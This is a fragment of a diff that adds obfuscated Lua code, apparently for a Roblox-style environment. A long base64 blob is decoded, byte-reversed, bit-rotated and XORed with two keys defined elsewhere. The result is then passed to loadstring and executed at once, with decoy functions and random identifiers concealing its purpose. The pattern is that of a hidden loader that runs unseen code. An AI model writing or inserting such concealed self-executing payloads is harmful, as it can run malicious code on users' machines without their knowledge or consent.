+"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",
+})
+
+local function zQczFjinRoHdvh(_x) return bit32.bnot(_x) end
+
+local GeZKMkJFogUbzC = (function()
+  local _a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+  return function(_s)
+    _s = _s:gsub("[^".._a.."=]","")
+    return (_s:gsub(".",function(_x)
+      if _x=="=" then return "" end
+      local _r,_f = "",(select(2,_a:find(_x))-1)
+      for _i=6,1,-1 do _r=_r..(_f%2^_i-_f%2^(_i-1)>0 and "1" or "0") end
+      return _r
+    end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(_x)
+      if #_x~=8 then return "" end
+      return string.char(tonumber(_x,2))
+    end))
+  end
+end)()
+
+local function VRR3zpbvIPD9ED(_x) return bit32.bnot(_x) end
+
+local hhr1RdS_Agplap = (function()
+  local MhYF0_nsUek9S4 = GeZKMkJFogUbzC(vxFsHp0JSeuh2b)
+
+  -- Reverse
+  local _len = #MhYF0_nsUek9S4
+  local _rev = table.create(_len, 0)
+  for _i = 1, _len do
+    _rev[_i] = string.byte(MhYF0_nsUek9S4, _len - _i + 1)
+  end
+
+  -- Unrotate bits
+  local _ur = gUGh_tVNDUwQ0B
+  for _i = 1, _len do
+    local _b = _rev[_i]
+    _rev[_i] = bit32.bor(bit32.rshift(_b, _ur), bit32.band(bit32.lshift(_b, 8 - _ur), 255))
+  end
+
+  -- XOR layer B
+  local _kbl = #SpI9JpoXQQ4f85
+  for _i = 1, _len do
+    _rev[_i] = bit32.bxor(_rev[_i], SpI9JpoXQQ4f85[((_i-1) % _kbl) + 1])
+  end
+
+  -- XOR layer A
+  local _kal = #R4ZibxR4_zxigL
+  for _i = 1, _len do
+    _rev[_i] = string.char(bit32.bxor(_rev[_i], R4ZibxR4_zxigL[((_i-1) % _kal) + 1]))
+  end
+
+  return table.concat(_rev)
+end)()
+
+local Hr3fSmIcT_u8QY, _e = loadstring(hhr1RdS_Agplap)
+if Hr3fSmIcT_u8QY then Hr3fSmIcT_u8QY() end
